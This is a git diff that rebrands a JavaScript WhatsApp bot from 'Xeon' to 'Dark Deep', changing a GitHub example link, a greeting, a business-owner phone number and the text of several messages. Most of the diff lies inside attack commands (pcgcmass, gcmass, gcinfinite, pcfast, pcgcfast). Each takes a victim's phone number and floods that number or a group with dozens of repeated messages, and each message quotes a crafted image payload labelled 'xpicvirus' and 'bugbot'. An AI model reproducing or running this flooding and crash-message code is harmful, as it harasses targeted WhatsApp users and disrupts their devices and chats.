@@ -3274,7 +3274,7 @@ m.reply(`There are no users who have rented bot yet`)
 }
 break
 case 'git': case 'gitclone':
-if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
+if (!args[0]) return m.reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/kumarduttadeep`)
 if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
 let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
     let [, user, repo] = args[0].match(regex1) || []
@@ -3669,7 +3669,7 @@ ${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Obje
                 ]
                 },
                 ]
-                XeonBotInc.sendListMsg(m.chat, `pilih aja *Din* Setmenu nya!`, XeonBotInc.user.name, `*Hello XeonBotInc* !`, `Pilih Din`, sections, m)
+                XeonBotInc.sendListMsg(m.chat, `pilih aja *Din* Setmenu nya!`, XeonBotInc.user.name, `*Hello KeplarBotInc* !`, `Pilih Din`, sections, m)
                 }
             }
             break
@@ -6569,7 +6569,7 @@ var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "retailerId": author,
 "url": websitex
 },
-"businessOwnerJid": "916909137213@s.whatsapp.net",
+"businessOwnerJid": "916291588399@s.whatsapp.net",
 }
 }), { userJid: m.chat, quoted: xeontalog })
 XeonBotInc.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
@@ -6716,7 +6716,7 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
@@ -6729,51 +6729,51 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
             await sleep(30000)
             await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pmgcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:pmgcmassxeon})
             await sleep(30000)
             }
             break
@@ -6790,64 +6790,64 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcmassxeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcmassxeon})
             await sleep(30000)
             reply(mess.success)
             break
@@ -6864,38 +6864,38 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
+            await XeonBotInc.sendMessage(m.chat, {text:"Dark Deep☣️"},{quoted:gcinfinitexeon})
             break
 case 'pcfast':               
            	
@@ -6910,36 +6910,36 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
+            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Dark Deep☣️"},{quoted:pcinfinitexeon})
             reply(mess.success)
             break
                    case 'pcgcfast':               
@@ -6956,65 +6956,65 @@ if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxx
                     message: { 
                         "imageMessage": { 
                             "mimetype": "image/jpeg", 
-                            "caption": `🦄ᵈʳᵉᵃᵐ ᵍᵘʸ ˣᵉᵒⁿ⸙xbugbot`,
+                            "caption": `ᴰᵃʳᵏ ᴰᵉᵉᵖ۝⸙bugbot`,
                             "jpegThumbnail": xpicvirus
                         } 
                     } 
                 }
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(m.chat, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
-            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Xeon Ezy☣️"},{quoted:pcgcinfinitexeon})
